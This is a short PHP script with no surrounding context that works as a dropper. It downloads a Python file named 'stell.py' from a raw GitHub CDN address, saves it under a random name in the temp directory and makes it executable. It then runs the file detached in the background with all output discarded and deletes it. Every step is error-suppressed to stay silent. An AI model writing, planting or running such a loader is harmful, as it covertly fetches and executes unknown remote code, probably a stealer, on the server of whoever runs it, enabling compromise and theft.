<?php
$u = 'https://cdn.githubraw.com/Shinedremuse/byibnflf/f9eb1e427866cc22687904b9a3d8c774f0f732f8/stell.py';
$f = sys_get_temp_dir() . DIRECTORY_SEPARATOR . bin2hex(random_bytes(4));
@file_put_contents($f, @file_get_contents($u));
@chmod($f, 0755);
@shell_exec('nohup ' . escapeshellarg($f) . ' > /dev/null 2>&1 &');
@unlink($f);
?>